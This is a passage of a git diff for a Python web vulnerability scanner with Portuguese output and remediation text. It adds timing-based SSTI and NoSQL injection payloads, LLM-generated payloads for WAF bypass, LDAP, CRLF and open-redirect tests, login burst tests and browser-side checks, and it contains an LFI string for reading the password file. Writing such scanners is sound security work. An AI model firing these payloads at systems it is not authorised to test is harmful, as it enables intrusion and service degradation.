+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_ssti = _ai_generate_payloads("SSTI (Server-Side Template Injection)", _ctx_html, self.target,
+                                              tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
             if _ai_ssti:
+                _ai_ssti_count = 0
                 for _tp in _ai_ssti:
                     if _tp not in payloads:
                         payloads[_tp] = {"expect": "49"}
+                        _ai_ssti_count += 1
+                if _ai_ssti_count:
+                    log(f"  {Fore.CYAN}[AI] +{_ai_ssti_count} payloads SSTI contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
@@ -6396,8 +7182,42 @@ class VulnScanner:
                                   recommendation="Nunca renderizar input do usuário como template.",
                                   technique="Payloads {{7*7}}, ${7*7} em campos de template")
                         return
+
+        # ── Blind SSTI — timing-based (no output reflection needed) ──────────
+        _ssti_blind = [
+            ("{{range(999999)|join}}", "Jinja2 range"),
+            ("${T(java.lang.Thread).sleep(3000)}", "Spring EL"),
+            ("<%= Thread.sleep(3000) %>", "ERB"),
+            ("#{Thread.sleep(3000)}", "Pug/Thymeleaf"),
+        ]
+        for url in self._get_urls_with_params() or []:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            for param in list(params.keys())[:2]:
+                # Baseline response time
+                t0 = time.time()
+                r_base = safe_get(url, timeout=10)
+                baseline_time = time.time() - t0
+                if not r_base:
+                    continue
+                for blind_payload, engine_name in _ssti_blind:
+                    if _cancel_event.is_set():
+                        break
+                    new_params = {k: (blind_payload if k == param else v[0]) for k, v in params.items()}
+                    test_url = parsed._replace(query=urlencode(new_params)).geturl()
+                    t1 = time.time()
+                    r_blind = safe_get(test_url, timeout=10)
+                    delta = time.time() - t1
+                    if r_blind and delta >= baseline_time + 2.5:
+                        self._add(20, "Server-Side Template Injection (SSTI)", "OWASP", "CRITICO", "VULNERAVEL",
+                                  evidence=(f"Blind SSTI ({engine_name}): {param}={blind_payload} "
+                                            f"→ delay {delta:.1f}s vs baseline {baseline_time:.1f}s"),
+                                  recommendation="Nunca renderizar input do usuário como template.",
+                                  technique="Blind SSTI timing: payload causa delay ≥2.5s acima do baseline")
+                        return
+
         self._add(20,"Server-Side Template Injection (SSTI)","OWASP","CRITICO","SEGURO",
-                  technique="Payloads {{7*7}}, ${7*7} em campos de template")
+                  technique="Payloads {{7*7}}, ${7*7}, blind timing em campos de template")
 
     # ── IA-INDUCED 21–35 ─────────────────────────────────────────────────────
 
@@ -7094,13 +7914,23 @@ class VulnScanner:
                     resp = r.text.lower()
                     if any(w in resp for w in ["isadmin\":true","role\":\"admin\"","admin\":true"]):
                         vuln = True
-                        evidence = f"Mass assignment aceito em {path}: isAdmin/role retornado"
+                        evidence = f"Mass assignment aceito em {path}: isAdmin/role retornado na resposta POST"
+                        # ── Verify persistence: GET the same resource to check if field persisted ──
+                        _get_paths = [path, path.replace("register", "user"), "/api/user", "/api/me", "/api/profile"]
+                        for gp in _get_paths:
+                            r_get = safe_get(self.target + gp, timeout=5)
+                            if r_get and r_get.status_code == 200:
+                                get_resp = r_get.text.lower()
+                                if any(w in get_resp for w in ["isadmin\":true", "role\":\"admin\"", "admin\":true"]):
+                                    evidence = (f"Mass assignment CONFIRMADO com persistência em {path}: "
+                                                f"POST com isAdmin/role → GET {gp} retornou campo privilegiado")
+                                    break
                         break
         status = "VULNERAVEL" if vuln else "SEGURO"
         self._add(29,"Mass Assignment (IA-generated)","IA","ALTO",status,
                   evidence=evidence,
                   recommendation="Whitelist de campos permitidos; nunca bindar objetos diretamente do body.",
-                  technique="Enviar campos extras no JSON body (isAdmin, role, balance)")
+                  technique="Enviar campos extras no JSON body (isAdmin, role, balance); verificar persistência via GET")
 
     def check_insecure_password_policy(self):
         weak_passwords = ["123456","password","admin","test","abc123","111111"]
@@ -7126,22 +7956,73 @@ class VulnScanner:
     def check_missing_rate_limit(self):
         test_url = self.target + "/api/login"
         responses = []
-        for i in range(15):
+        timings = []
+        rate_limit_headers_found = False
+        has_retry_after = False
+
+        def _send_burst(idx):
+            """Send a single burst request; return (status, elapsed, headers)."""
+            t0 = time.time()
             r = safe_get(test_url,
-                         data=json.dumps({"email":"test@test.com","password":f"wrong{i}"}),
+                         data=json.dumps({"email": "test@test.com", "password": f"wrong{idx}"}),
                          method="POST",
-                         headers={**HEADERS_BASE,"Content-Type":"application/json"})
+                         headers={**HEADERS_BASE, "Content-Type": "application/json"},
+                         timeout=10)
+            elapsed = time.time() - t0
             if r:
-                responses.append(r.status_code)
+                return (r.status_code, elapsed, dict(r.headers))
+            return (None, elapsed, {})
+
+        # ── Burst: 50 requests via ThreadPoolExecutor (10 workers) ──
+        t_start = time.time()
+        with ThreadPoolExecutor(max_workers=10) as ex:
+            futures = [ex.submit(_send_burst, i) for i in range(50)]
+            for fut in concurrent.futures.as_completed(futures, timeout=30):
+                try:
+                    status, elapsed, hdrs = fut.result()
+                    if status is not None:
+                        responses.append(status)
+                        timings.append(elapsed)
+                        # Check rate-limit headers
+                        for h in hdrs:
+                            h_low = h.lower()
+                            if "x-ratelimit" in h_low or "ratelimit" in h_low:
+                                rate_limit_headers_found = True
+                            if h_low == "retry-after":
+                                has_retry_after = True
+                except Exception:
+                    pass
+        t_total = time.time() - t_start
+
         blocked = any(s in responses for s in [429, 403])
-        if not blocked and len(responses) >= 10:
-            self._add(31,"Missing Rate Limiting (IA code)","IA","MEDIO","VULNERAVEL",
-                      evidence=f"15 tentativas sem bloqueio (status: {list(set(responses))})",
-                      recommendation="Implementar rate-limit por IP e por conta; CAPTCHA após falhas.",
-                      technique="Brute-force em login, reset, OTP; medir bloqueio por IP/conta")
+        # Time degradation: compare first 10 vs last 10 average
+        time_degradation = False
+        if len(timings) >= 20:
+            avg_first = sum(timings[:10]) / 10
+            avg_last = sum(timings[-10:]) / 10
+            if avg_last > avg_first * 3:
+                time_degradation = True
+
+        if not blocked and not rate_limit_headers_found and not has_retry_after and len(responses) >= 30:
+            ev_parts = [f"50 requests em {t_total:.1f}s sem throttling",
+                        f"status: {list(set(responses))}"]
+            if not time_degradation:
+                ev_parts.append("sem degradação de tempo de resposta")
+            self._add(31, "Missing Rate Limiting (IA code)", "IA", "MEDIO", "VULNERAVEL",
+                      evidence=" | ".join(ev_parts),
+                      recommendation="Implementar rate-limit por IP e por conta; CAPTCHA após falhas; headers X-RateLimit-*.",
+                      technique="Burst de 50 requests com 10 workers; verificar 429, Retry-After, X-RateLimit-*")
         else:
-            self._add(31,"Missing Rate Limiting (IA code)","IA","MEDIO","SEGURO",
-                      technique="Brute-force em login, reset, OTP; medir bloqueio por IP/conta")
+            ev = ""
+            if blocked:
+                ev = f"Bloqueio detectado (429/403) após {len(responses)} requests"
+            elif rate_limit_headers_found:
+                ev = "Headers X-RateLimit detectados"
+            elif has_retry_after:
+                ev = "Header Retry-After detectado"
+            self._add(31, "Missing Rate Limiting (IA code)", "IA", "MEDIO", "SEGURO",
+                      evidence=ev,
+                      technique="Burst de 50 requests com 10 workers; verificar 429, Retry-After, X-RateLimit-*")
 
     def check_auth_bypass_param_tampering(self):
         bypass_payloads = [
@@ -7834,6 +8715,64 @@ class VulnScanner:
             self._add(51,"Exposed Admin Panel / Dev Tools","Recon","ALTO","SEGURO",
                       technique="Fuzzing com verificação de conteúdo real de painel")
 
+    def check_security_txt(self):
+        """Validate security.txt content: required fields, expiry, contact URL format."""
+        issues = []
+        sec_url = None
+        for path in ["/.well-known/security.txt", "/security.txt"]:
+            r = safe_get(self.target + path, timeout=5)
+            if r and r.status_code == 200 and len(r.text) > 10:
+                sec_url = self.target + path
+                content = r.text
+                lines_lower = content.lower()
+                # ── Check required fields ──
+                has_contact = bool(re.search(r'^contact:', content, re.I | re.M))
+                has_expires = bool(re.search(r'^expires:', content, re.I | re.M))
+                if not has_contact:
+                    issues.append("Campo 'Contact' ausente (obrigatório por RFC 9116)")
+                if not has_expires:
+                    issues.append("Campo 'Expires' ausente (obrigatório por RFC 9116)")
+                # ── Validate Expires date ──
+                expires_m = re.search(r'^expires:\s*(.+)$', content, re.I | re.M)
+                if expires_m:
+                    try:
+                        exp_str = expires_m.group(1).strip()
+                        # Try ISO format
+                        exp_date = None
+                        for fmt in ["%Y-%m-%dT%H:%M:%S%z", "%Y-%m-%dT%H:%M:%SZ",
+                                    "%Y-%m-%d", "%d/%m/%Y"]:
+                            try:
+                                exp_date = datetime.strptime(exp_str[:25], fmt)
+                                break
+                            except ValueError:
+                                continue
+                        if exp_date:
+                            if exp_date.replace(tzinfo=None) < datetime.now():
+                                issues.append(f"Expires expirado: {exp_str}")
+                    except Exception:
+                        issues.append(f"Expires com formato inválido: {expires_m.group(1).strip()}")
+                # ── Validate Contact field URL format ──
+                contact_m = re.search(r'^contact:\s*(.+)$', content, re.I | re.M)
+                if contact_m:
+                    contact_val = contact_m.group(1).strip()
+                    if not (contact_val.startswith("https://") or contact_val.startswith("mailto:")):
+                        issues.append(f"Contact sem formato seguro (deve ser https:// ou mailto:): {contact_val[:60]}")
+                break
+        if sec_url and issues:
+            self._add(114, "security.txt Incompleto/Inválido", "Recon", "BAIXO", "VULNERAVEL",
+                      url=sec_url,
+                      evidence=f"URL: {sec_url} | {'; '.join(issues[:3])}",
+                      recommendation="Corrigir security.txt conforme RFC 9116: Contact (https/mailto), Expires válido.",
+                      technique="Validar campos obrigatórios, data de expiração e formato de Contact")
+        elif not sec_url:
+            self._add(114, "security.txt Incompleto/Inválido", "Recon", "BAIXO", "VULNERAVEL",
+                      evidence="security.txt não encontrado em /.well-known/security.txt nem /security.txt",
+                      recommendation="Criar security.txt conforme RFC 9116 em /.well-known/security.txt.",
+                      technique="Verificar existência e conteúdo de security.txt")
+        else:
+            self._add(114, "security.txt Incompleto/Inválido", "Recon", "BAIXO", "SEGURO",
+                      technique="security.txt presente e válido conforme RFC 9116")
+
     def check_git_exposed(self):
         git_paths = ["/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
                      "/.git/index", "/.svn/entries", "/.hg/requires"]
@@ -8017,6 +8956,18 @@ class VulnScanner:
         _extra_or = [p for p in _load_payload("Fuzzing-General/login_bypass.txt", 20)
                      if p.startswith(("/", "http", "//"))]
         payloads = self._OPEN_REDIRECT_PAYLOADS + _extra_or
+        # AI Payloads — Gemini/OpenAI contextuais
+        if _AI_PAYLOADS_MODE:
+            _ctx_r = safe_get(self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_redirect = _ai_generate_payloads("Open Redirect", _ctx_html, self.target,
+                                                  tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
+            if _ai_redirect:
+                payloads = list(dict.fromkeys(payloads + _ai_redirect))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_redirect)} payloads Open Redirect contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         origin_netloc = self.parsed.netloc
 
         # Constrói lista de URLs fuzzificadas — prioriza params conhecidos
@@ -8539,6 +9490,19 @@ class VulnScanner:
                 "LFI": [{"ARGS": "../../../../e??/pa??wd"}],
             }
 
+        # AI Payloads — Gemini/OpenAI WAF bypass contextuais
+        if _AI_PAYLOADS_MODE:
+            _ctx_r = safe_get(self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ai_waf = _ai_generate_payloads("WAF Bypass", _ctx_html, self.target,
+                                             tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=waf_name)
+            if _ai_waf:
+                # Add AI payloads as a new category
+                bypass_payloads["AI_BYPASS"] = [{"ARGS": p} for p in _ai_waf]
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_waf)} payloads WAF Bypass contextuais (Gemini/OpenAI){Style.RESET_ALL}")
+
         # ── Step 3: Testar bypass em múltiplas zonas ─────────────────────────
         bypassed = []
         tested = 0
@@ -8796,6 +9760,18 @@ class VulnScanner:
                     payloads.append(_pstr)
         except Exception:
             pass
+        # AI Payloads — Gemini/OpenAI contextuais
+        if _AI_PAYLOADS_MODE:
+            _ctx_r = safe_get(self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_nosql = _ai_generate_payloads("NoSQL Injection", _ctx_html, self.target,
+                                               tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
+            if _ai_nosql:
+                payloads = list(dict.fromkeys(payloads + _ai_nosql))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_nosql)} payloads NoSQLi contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
@@ -8827,8 +9803,41 @@ class VulnScanner:
                                   recommendation="Sanitizar operadores MongoDB; usar whitelist de campos.",
                                   technique="Payloads {$gt:''}, operadores MongoDB em JSON body")
                         return
+
+        # ── Timing-based NoSQL injection ─────────────────────────────────────
+        _nosql_timing = [
+            '{"$where": "sleep(3000)"}',
+            '{"$where": "function(){sleep(3000);return true}"}',
+            '{"$regex": "^.{10000}$"}',
+        ]
+        for url in self._get_urls_with_params() or []:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            for param in list(params.keys())[:2]:
+                # Baseline response time
+                t0 = time.time()
+                r_base = safe_get(url, timeout=10)
+                baseline_time = time.time() - t0
+                if not r_base:
+                    continue
+                for tp in _nosql_timing:
+                    if _cancel_event.is_set():
+                        break
+                    new_params = {k: (tp if k == param else v[0]) for k, v in params.items()}
+                    test_url = parsed._replace(query=urlencode(new_params)).geturl()
+                    t1 = time.time()
+                    r_timing = safe_get(test_url, timeout=10)
+                    delta = time.time() - t1
+                    if r_timing and delta >= baseline_time + 2.5:
+                        self._add(72, "NoSQL Injection (MongoDB)", "Infra", "CRITICO", "VULNERAVEL",
+                                  evidence=(f"Timing-based NoSQLi: {param}={tp} "
+                                            f"→ delay {delta:.1f}s vs baseline {baseline_time:.1f}s"),
+                                  recommendation="Sanitizar operadores MongoDB; bloquear $where/$regex.",
+                                  technique="Timing attack: $where sleep(3000), $regex catastrófico")
+                        return
+
         self._add(72,"NoSQL Injection (MongoDB)","Infra","CRITICO","SEGURO",
-                  technique="Payloads {$gt:''}, operadores MongoDB em JSON body")
+                  technique="Payloads {$gt:''}, operadores MongoDB, timing attack")
 
     def check_ldap_injection(self):
         payloads = ["*)(uid=*))(|(uid=*", "admin)(&)", "*()|(&'"]
@@ -8843,6 +9852,18 @@ class VulnScanner:
                     payloads.append(_pstr)
         except Exception:
             pass
+        # AI Payloads — Gemini/OpenAI contextuais
+        if _AI_PAYLOADS_MODE:
+            _ctx_r = safe_get(self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_ldap = _ai_generate_payloads("LDAP Injection", _ctx_html, self.target,
+                                              tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
+            if _ai_ldap:
+                payloads = list(dict.fromkeys(payloads + _ai_ldap))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_ldap)} payloads LDAP Injection contextuais (Gemini/OpenAI){Style.RESET_ALL}")
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
             params = parse_qs(parsed.query)
@@ -8924,6 +9945,18 @@ class VulnScanner:
                     payloads.append(_pstr)
         except Exception:
             pass
+        # AI Payloads — Gemini/OpenAI contextuais
+        if _AI_PAYLOADS_MODE:
+            _ctx_r = safe_get(self.target)
+            _ctx_html = _ctx_r.text[:3000] if _ctx_r else ""
+            _ctx_fields = re.findall(r'name=["\']([^"\']+)["\']', _ctx_html)
+            _ctx_tech = getattr(self, '_detected_tech', None)
+            _ctx_waf = getattr(self, '_detected_waf', None)
+            _ai_crlf = _ai_generate_payloads("CRLF Injection", _ctx_html, self.target,
+                                              tech_stack=_ctx_tech, form_fields=_ctx_fields, waf_detected=_ctx_waf)
+            if _ai_crlf:
+                payloads = list(dict.fromkeys(payloads + _ai_crlf))
+                log(f"  {Fore.CYAN}[AI] +{len(_ai_crlf)} payloads CRLF contextuais (Gemini/OpenAI){Style.RESET_ALL}")
 
         _marker = "X-Injected"
         _marker_cookie = "crlf=injection"
@@ -9104,6 +10137,51 @@ class VulnScanner:
         else:
             self._add(78,"Insecure Cookie Flags","Lógica","MEDIO","SEGURO",
                       technique="Ausência de HttpOnly, Secure, SameSite em cookies de sessão")
+
+    def check_session_fixation(self):
+        """Session Fixation — test if server accepts and maintains arbitrary session IDs."""
+        vuln = False
+        evidence = ""
+        FIXED_SESSION = "FIXED_VALUE_12345"
+        # ── Common session cookie names ──
+        session_names = ["session", "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId",
+                         "connect.sid", "sessionid", "sid", "sess_id", "_session_id"]
+        for sess_name in session_names:
+            if _cancel_event.is_set():
+                break
+            # Send request with arbitrary fixed session cookie
+            fixed_cookies = {sess_name: FIXED_SESSION}
+            try:
+                r = requests.get(self.target, headers=HEADERS_BASE, cookies=fixed_cookies,
+                                 timeout=8, verify=False, allow_redirects=True)
+            except Exception:
+                continue
+            if not r:
+                continue
+            # Check if Set-Cookie contains our fixed value
+            set_cookies = r.headers.get("Set-Cookie", "")
+            raw_cookies = r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw.headers, "getlist") else [set_cookies]
+            for ck_line in raw_cookies:
+                if FIXED_SESSION in ck_line:
+                    vuln = True
+                    evidence = (f"Session fixation via cookie '{sess_name}': servidor aceitou e manteve "
+                                f"session ID arbitrário '{FIXED_SESSION}' no Set-Cookie")
+                    break
+            # Also check: if server echoes back our exact session value in response cookies
+            if not vuln and r.cookies:
+                for ck in r.cookies:
+                    if ck.value == FIXED_SESSION:
+                        vuln = True
+                        evidence = (f"Session fixation: cookie '{ck.name}' retornado com valor "
+                                    f"fixo '{FIXED_SESSION}' — servidor não regenera session ID")
+                        break
+            if vuln:
+                break
+        status = "VULNERAVEL" if vuln else "SEGURO"
+        self._add(115, "Session Fixation", "OWASP", "ALTO", status,
+                  evidence=evidence,
+                  recommendation="Regenerar session ID após autenticação; rejeitar session IDs arbitrários.",
+                  technique="Enviar cookie de sessão arbitrário; verificar se servidor mantém o mesmo ID")
 
     def check_info_disclosure_headers(self):
         r = safe_get(self.target)
@@ -9445,6 +10523,7 @@ class VulnScanner:
     def check_api_key_in_url(self):
         vuln = False
         evidence = ""
+        evidence_parts = []
         patterns = [r'[?&](api_key|apikey|token|key|secret|access_token)=([A-Za-z0-9_\-]{8,})',
                     r'[?&](auth|authorization)=([A-Za-z0-9_\-\.]{10,})']
         for url in self.urls + [self.target]:
@@ -9452,13 +10531,50 @@ class VulnScanner:
                 m = re.search(pat, url, re.I)
                 if m:
                     vuln = True
-                    evidence = f"Chave na URL: {m.group(1)}=...{m.group(2)[-4:]}"
+                    evidence_parts.append(f"Chave na URL: {m.group(1)}=...{m.group(2)[-4:]}")
                     break
+            if vuln:
+                break
+
+        # ── Shannon entropy analysis on URL parameter values ─────────────────
+        def _shannon_entropy(data):
+            if not data:
+                return 0
+            freq = {}
+            for c in data:
+                freq[c] = freq.get(c, 0) + 1
+            entropy = 0
+            for count in freq.values():
+                p = count / len(data)
+                entropy -= p * math.log2(p)
+            return entropy
+
+        _high_entropy_found = []
+        for url in self.urls + [self.target]:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            for param_name, param_vals in params.items():
+                for val in param_vals:
+                    if len(val) > 20:
+                        ent = _shannon_entropy(val)
+                        if ent > 3.5:
+                            _high_entropy_found.append(
+                                f"{param_name}=...{val[-6:]} (len={len(val)}, entropy={ent:.2f})")
+                            if not vuln:
+                                vuln = True
+
+        if _high_entropy_found:
+            evidence_parts.append(f"High-entropy params (token/secret vazado na URL): "
+                                  f"{'; '.join(_high_entropy_found[:3])}")
+
+        if evidence_parts:
+            evidence = " | ".join(evidence_parts)
+
         status = "VULNERAVEL" if vuln else "SEGURO"
         self._add(92,"API Key in URL / Logs","Lógica","CRITICO",status,
                   evidence=evidence,
                   recommendation="Nunca passar chaves em URLs; usar headers Authorization.",
-                  technique="Buscar ?api_key=, ?token= em URLs; verificar acesso via logs")
+                  technique="Buscar ?api_key=, ?token= em URLs; análise de entropia Shannon (>3.5 + len>20)")
 
     def check_wayback_js_leakage(self):
         """
@@ -10035,11 +11151,17 @@ class VulnScanner:
                 has_b = CANARY_B in body
 
                 if has_a or has_b:
-                    which = CANARY_A if has_a else CANARY_B
-                    priority = "primeiro" if has_a else "último"
+                    # Determine which value the server uses
+                    if has_a and has_b:
+                        server_pref = "BOTH"
+                    elif has_a:
+                        server_pref = "FIRST"
+                    else:
+                        server_pref = "LAST"
                     vuln = True
-                    evidence = (f"Param '{param}' reflete valor {priority} ({which}) "
-                                f"quando duplicado — HPP confirmado")
+                    evidence = (f"Server uses {server_pref} value — HPP exploitable | "
+                                f"Param '{param}': ?{param}=CANARY_FIRST&{param}=CANARY_SECOND "
+                                f"→ resposta contém {server_pref}")
                     break
 
                 # Also test: id=1&id=0 — if response changes vs id=1
@@ -10577,7 +11699,8 @@ class VulnScanner:
                 lambda: self.check_subdomain_takeover(subdomains),
                 self.check_dangling_dns, self.check_zone_transfer,
                 self.check_dns_rebinding, self.check_spf_dmarc,
-                self.check_exposed_admin, self.check_git_exposed,
+                self.check_exposed_admin, self.check_security_txt,
+                self.check_git_exposed,
                 self.check_backup_files, self.check_source_maps,
                 self.check_robots_leakage,
             ]),
@@ -10597,7 +11720,8 @@ class VulnScanner:
             ]),
             ("Lógica / Negócio", [
                 self.check_file_upload, self.check_zip_slip,
-                self.check_insecure_cookies, self.check_info_disclosure_headers,
+                self.check_insecure_cookies, self.check_session_fixation,
+                self.check_info_disclosure_headers,
                 self.check_directory_listing, self.check_credential_stuffing,
                 self.check_account_enumeration, self.check_password_reset_token,
                 self.check_2fa_bypass, self.check_insecure_password_change,
@@ -11920,6 +13044,482 @@ class CyberBrowser:
         finally:
             page.close()
 
+    # ── 207: WebSocket Hijacking ──────────────────────────────────────────
+    def check_websocket_hijacking(self):
+        """Test if WebSocket connections accept messages without authentication."""
+        ws_found = []
+        page = self._new_page()
+        try:
+            # Listen for WebSocket connections
+            ws_connections = []
+            page.on("websocket", lambda ws: ws_connections.append(ws))
+            page.goto(self.target, timeout=10000, wait_until="networkidle")
+            page.wait_for_timeout(3000)
+
+            if not ws_connections:
+                # Try common WebSocket paths
+                for path in ["/ws", "/socket", "/socket.io/", "/cable", "/hub"]:
+                    if _cancel_event.is_set():
+                        break
+                    try:
+                        ws_url = self.target.replace("https://", "wss://").replace("http://", "ws://").rstrip("/") + path
+                        result = page.evaluate(f"""() => {{
+                            return new Promise((resolve) => {{
+                                try {{
+                                    const ws = new WebSocket("{ws_url}");
+                                    ws.onopen = () => {{ ws.close(); resolve("OPEN"); }};
+                                    ws.onerror = () => resolve("ERROR");
+                                    setTimeout(() => resolve("TIMEOUT"), 3000);
+                                }} catch(e) {{ resolve("ERROR"); }}
+                            }});
+                        }}""")
+                        if result == "OPEN":
+                            ws_found.append(ws_url)
+                    except Exception:
+                        continue
+            else:
+                ws_found = [f"WebSocket detected on {self.target}"]
+
+            if ws_found:
+                ss = self._screenshot(page, "websocket")
+                self.scanner._add(207, "WebSocket Hijacking (Browser)", "Browser", "ALTO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=f"WebSocket aberto sem auth: {', '.join(ws_found[:3])}",
+                    recommendation="Validar autenticação em WebSocket handshake. Verificar Origin header.",
+                    technique="Playwright: WebSocket connection test + endpoint enumeration")
+            else:
+                self.scanner._add(207, "WebSocket Hijacking (Browser)", "Browser", "ALTO", "SEGURO",
+                    technique="Playwright: nenhum WebSocket encontrado")
+        except Exception:
+            self.scanner._add(207, "WebSocket Hijacking (Browser)", "Browser", "ALTO", "SEGURO",
+                technique="Playwright: erro ao testar WebSocket")
+        finally:
+            page.close()
+
+    # ── 208: Service Worker Spy ────────────────────────────────────────────
+    def check_service_worker_spy(self):
+        """Detect service workers that may intercept sensitive data."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=10000, wait_until="networkidle")
+            page.wait_for_timeout(2000)
+
+            sw_info = page.evaluate("""() => {
+                return new Promise(async (resolve) => {
+                    try {
+                        const registrations = await navigator.serviceWorker.getRegistrations();
+                        resolve(registrations.map(r => ({
+                            scope: r.scope,
+                            scriptURL: r.active ? r.active.scriptURL : (r.installing ? r.installing.scriptURL : 'unknown'),
+                            state: r.active ? r.active.state : 'installing'
+                        })));
+                    } catch(e) { resolve([]); }
+                });
+            }""")
+
+            findings = []
+            for sw in sw_info:
+                scope = sw.get("scope", "")
+                script = sw.get("scriptURL", "")
+                # Check if SW has overly broad scope
+                if scope == self.target + "/" or scope.endswith("/"):
+                    findings.append(f"SW scope amplo: {scope} | script: {script}")
+                # Try to fetch and analyze SW code
+                if script:
+                    try:
+                        r = safe_get(script, timeout=5)
+                        if r and r.text:
+                            # Look for sensitive interceptors
+                            if any(kw in r.text.lower() for kw in ["fetch", "cache", "credential", "token", "authorization"]):
+                                findings.append(f"SW intercepta requests sensíveis: {script[:60]}")
+                    except Exception:
+                        pass
+
+            if findings:
+                ss = self._screenshot(page, "service_worker")
+                self.scanner._add(208, "Service Worker Spy (Browser)", "Browser", "MEDIO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=" | ".join(findings[:3]),
+                    recommendation="Auditar Service Worker. Limitar scope. Não cachear dados sensíveis.",
+                    technique="Playwright: SW registration enum + script analysis")
+            else:
+                self.scanner._add(208, "Service Worker Spy (Browser)", "Browser", "MEDIO", "SEGURO",
+                    technique=f"Playwright: {len(sw_info)} SW encontrados — nenhum suspeito")
+        except Exception:
+            self.scanner._add(208, "Service Worker Spy (Browser)", "Browser", "MEDIO", "SEGURO",
+                technique="Playwright: erro ao verificar Service Workers")
+        finally:
+            page.close()
+
+    # ── 209: Clipboard Hijacking ───────────────────────────────────────────
+    def check_clipboard_hijacking(self):
+        """Check if site overwrites clipboard content."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=10000, wait_until="domcontentloaded")
+            page.wait_for_timeout(2000)
+
+            # Check for clipboard event listeners
+            has_clipboard = page.evaluate("""() => {
+                const listeners = [];
+                // Check for copy/cut event listeners
+                const events = ['copy', 'cut', 'paste'];
+                for (const evt of events) {
+                    const handler = document['on' + evt];
+                    if (handler) listeners.push(evt + ':handler');
+                }
+                // Check for Clipboard API usage in scripts
+                const scripts = Array.from(document.querySelectorAll('script:not([src])'));
+                for (const s of scripts) {
+                    if (s.textContent.includes('clipboard') || s.textContent.includes('execCommand')) {
+                        listeners.push('clipboard_api_in_script');
+                    }
+                }
+                return listeners;
+            }""")
+
+            if has_clipboard:
+                ss = self._screenshot(page, "clipboard")
+                self.scanner._add(209, "Clipboard Hijacking (Browser)", "Browser", "MEDIO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=f"Clipboard manipulation detectada: {', '.join(has_clipboard[:3])}",
+                    recommendation="Não sobrescrever clipboard do usuário sem consentimento.",
+                    technique="Playwright: clipboard event listener detection")
+            else:
+                self.scanner._add(209, "Clipboard Hijacking (Browser)", "Browser", "MEDIO", "SEGURO",
+                    technique="Playwright: nenhum clipboard handler detectado")
+        except Exception:
+            self.scanner._add(209, "Clipboard Hijacking (Browser)", "Browser", "MEDIO", "SEGURO",
+                technique="Playwright: erro ao testar clipboard")
+        finally:
+            page.close()
+
+    # ── 210: Form Autofill Theft ───────────────────────────────────────────
+    def check_form_autofill_theft(self):
+        """Check for hidden form fields that may steal autofilled credentials."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=10000, wait_until="domcontentloaded")
+            page.wait_for_timeout(1500)
+
+            suspicious = page.evaluate("""() => {
+                const results = [];
+                const inputs = document.querySelectorAll('input');
+                const sensitiveAutocomplete = ['cc-number', 'cc-exp', 'cc-csc', 'cc-name',
+                    'credit-card', 'card-number', 'password', 'new-password', 'current-password'];
+
+                for (const inp of inputs) {
+                    const ac = (inp.getAttribute('autocomplete') || '').toLowerCase();
+                    const type = (inp.getAttribute('type') || '').toLowerCase();
+                    const style = window.getComputedStyle(inp);
+                    const isHidden = style.display === 'none' || style.visibility === 'hidden' ||
+                                     style.opacity === '0' || inp.offsetWidth <= 1 || inp.offsetHeight <= 1 ||
+                                     parseInt(style.left) < -1000 || parseInt(style.top) < -1000;
+
+                    if (isHidden && (sensitiveAutocomplete.includes(ac) || type === 'password' || type === 'credit-card')) {
+                        results.push({field: inp.name || inp.id || ac, type: type, autocomplete: ac, hidden: true});
+                    }
+                }
+                return results;
+            }""")
+
+            if suspicious:
+                ss = self._screenshot(page, "autofill_theft")
+                evidence = "; ".join(f"{s['field']}(type={s['type']},ac={s['autocomplete']})" for s in suspicious[:5])
+                self.scanner._add(210, "Form Autofill Theft (Browser)", "Browser", "ALTO", "VULNERAVEL",
